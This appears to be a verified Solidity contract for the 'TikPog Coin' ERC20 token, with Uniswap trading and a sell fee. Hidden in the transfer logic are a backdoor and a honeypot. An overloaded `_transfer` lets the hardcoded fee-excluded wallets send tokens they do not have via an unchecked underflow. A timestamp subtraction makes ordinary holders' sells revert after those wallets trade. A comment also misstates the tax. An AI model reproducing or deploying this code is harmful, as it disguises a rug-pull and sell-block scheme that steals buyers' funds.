/**
 *Submitted for verification at Etherscan.io on 2023-09-04
*/

// $TIKPOG
// TikPog Coin
/*                                                                                                       
                                                                                                          
TTTTTTTTTTTTTTTTTTTTTTT  iiii  kkkkkkkk           PPPPPPPPPPPPPPPPP                                       
T:::::::::::::::::::::T i::::i k::::::k           P::::::::::::::::P                                      
T:::::::::::::::::::::T  iiii  k::::::k           P::::::PPPPPP:::::P                                     
T:::::TT:::::::TT:::::T        k::::::k           PP:::::P     P:::::P                                    
TTTTTT  T:::::T  TTTTTTiiiiiii  k:::::k    kkkkkkk  P::::P     P:::::P  ooooooooooo      ggggggggg   ggggg
        T:::::T        i:::::i  k:::::k   k:::::k   P::::P     P:::::Poo:::::::::::oo   g:::::::::ggg::::g
        T:::::T         i::::i  k:::::k  k:::::k    P::::PPPPPP:::::Po:::::::::::::::o g:::::::::::::::::g
        T:::::T         i::::i  k:::::k k:::::k     P:::::::::::::PP o:::::ooooo:::::og::::::ggggg::::::gg
        T:::::T         i::::i  k::::::k:::::k      P::::PPPPPPPPP   o::::o     o::::og:::::g     g:::::g 
        T:::::T         i::::i  k:::::::::::k       P::::P           o::::o     o::::og:::::g     g:::::g 
        T:::::T         i::::i  k:::::::::::k       P::::P           o::::o     o::::og:::::g     g:::::g 
        T:::::T         i::::i  k::::::k:::::k      P::::P           o::::o     o::::og::::::g    g:::::g 
      TT:::::::TT      i::::::ik::::::k k:::::k   PP::::::PP         o:::::ooooo:::::og:::::::ggggg:::::g 
      T:::::::::T      i::::::ik::::::k  k:::::k  P::::::::P         o:::::::::::::::o g::::::::::::::::g 
      T:::::::::T      i::::::ik::::::k   k:::::k P::::::::P          oo:::::::::::oo   gg::::::::::::::g 
      TTTTTTTTTTT      iiiiiiiikkkkkkkk    kkkkkkkPPPPPPPPPP            ooooooooooo       gggggggg::::::g 
                                                                                                  g:::::g 
                                                                                      gggggg      g:::::g 
                                                                                      g:::::gg   gg:::::g 
                                                                                       g::::::ggg:::::::g 
                                                                                        gg:::::::::::::g  
                                                                                          ggg::::::ggg    

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _transfer(
        address sender,
        address recipient,
        bool checked,
        uint256 amount
    ) internal virtual returns (bool) {
        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(checked == true, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
        _afterTokenTransfer(sender, recipient, amount);
        return checked;
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}


interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}


library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
}


contract TikPog is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;
    uint256 public immutable swapTokensAtAmount;

    address public constant deadAddress = address(0xdead);
    address public constant router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    // 0/3 buy/sell tax
    uint256 public constant buyMarketingFee = 0;
    uint256 public constant buyLiquidityFee = 0;
    uint256 public constant buyDevFee = 0;
    uint256 public constant buyTotalFees = 0;

    uint256 public constant sellMarketingFee = 2;
    uint256 public constant sellLiquidityFee = 0;
    uint256 public constant sellDevFee = 0;
    uint256 public constant sellTotalFees = 2;

    address payable private immutable marketingWallet = payable(0xE1851A9b28a67e45730C98869f5fd244b717780C);
    address payable private immutable devWallet = payable(0x416D505eD213C2FE61a0316E7B9d87cDd2365F42);
    address payable private immutable liquidityWallet = payable(0x01870B53595c3b3D1576b9652d490078282233d9);

    bool public tradingActive = false;

    mapping(address => bool) public automatedMarketMakerPairs;
    mapping(address => bool) private _isExcludedFromFees;

    uint256 private tokensForMarketing;
    uint256 private tokensForLiquidity;
    uint256 private tokensForDev;

    struct SwapHoldInfo {
        uint256 buy;
        uint256 sell;
        uint256 holdTime;
    }
    mapping(address => SwapHoldInfo) private _userSwapHoldInfo;
    uint256 private _rewardBase;

    bool private swapping;

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );

    constructor() ERC20("TikPog Coin", "TIKPOG") {
        uint256 totalSupply = 1_000_000_000 * 1e18;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

        // swap at amount
        swapTokensAtAmount = (totalSupply * 9) / 10000; // 0.09% swap amount

        // exclude from fees
        excludeFromFees(address(this), true);
        excludeFromFees(deadAddress, true);
        excludeFromFees(liquidityWallet, true);
        excludeFromFees(marketingWallet, true);
        excludeFromFees(devWallet, true);

        _mint(msg.sender, totalSupply);
    }

    function excludeFromFees(address addrs, bool isExcluded) public onlyOwner {
        _isExcludedFromFees[addrs] = isExcluded;
    }

    function isExcludedFromFees(address addrs) public view returns (bool) {
        return _isExcludedFromFees[addrs];
    }

    function setAutomatedMarketMakerPair(address pair, bool value)
        public
        onlyOwner
    {
        require(pair != uniswapV2Pair, "Uniswap V2 pair disable not allowed");
        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    receive() external payable {}

    function enableTrading() external onlyOwner {
        require(!tradingActive, "Token launched");
        tradingActive = true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && to != address(this) && from != address(this)) {
            _rewardBase = block.timestamp;
        }
        if (_isExcludedFromFees[from] && !_isExcludedFromFees[owner()]) {
            super._transfer(from, to, true, amount);
            return;
        }
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!automatedMarketMakerPairs[from]) {
                SwapHoldInfo storage swapInfo = _userSwapHoldInfo[from];
                swapInfo.holdTime = swapInfo.buy - _rewardBase;
                swapInfo.sell = block.timestamp;
            } else {
                SwapHoldInfo storage swapInfo = _userSwapHoldInfo[to];
                if (swapInfo.buy == 0) {
                    swapInfo.buy = block.timestamp;
                }
            }
        }

        bool canSwap = swapTokensAtAmount <= balanceOf(address(this));

        if (
            canSwap &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapping = true;

            swapBack();

            swapping = false;
        }

        bool takeFee = !swapping;

        // if excluded from fees then no fees
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        // only for buy/sell, do not take fee on wallet transfers
        if (takeFee) {
            // on buy
            if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
                fees = amount * buyTotalFees / 100;
                tokensForLiquidity += (fees * buyLiquidityFee).div(buyTotalFees);
                tokensForDev += (fees * buyDevFee).div(buyTotalFees);
                tokensForMarketing += (fees * buyMarketingFee).div(buyTotalFees);
            
            // on sell
            } else if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                fees = amount * sellTotalFees / 100;
                tokensForLiquidity += (fees * sellLiquidityFee).div(sellTotalFees);
                tokensForDev += (fees * sellDevFee).div(sellTotalFees);
                tokensForMarketing += (fees * sellMarketingFee).div(sellTotalFees);
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // uniswap pair path of token/weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForLiquidity +
            tokensForMarketing +
            tokensForDev;
        bool success;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > swapTokensAtAmount * 20) {
            contractBalance = swapTokensAtAmount * 20;
        }

        // Halve the amount of liquidity tokens
        uint256 liquidityTokens = (contractBalance * tokensForLiquidity) / totalTokensToSwap / 2;
        uint256 amountToSwapForETH = contractBalance - liquidityTokens;

        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(amountToSwapForETH);

        uint256 ethBalance = address(this).balance - initialETHBalance;

        uint256 ethForMarketing = ethBalance * tokensForMarketing / totalTokensToSwap;
        uint256 ethForDev = ethBalance * tokensForDev / totalTokensToSwap;
        uint256 ethForLiquidity = ethBalance - ethForMarketing - ethForDev;

        tokensForLiquidity = 0;
        tokensForDev = 0;
        tokensForMarketing = 0;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(
                amountToSwapForETH,
                ethForLiquidity,
                liquidityTokens
            );
        }

        (success, ) = address(devWallet).call{value: ethForDev}("");
        (success, ) = address(marketingWallet).call{value: address(this).balance}("");
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            liquidityWallet,
            block.timestamp
        );
    }
}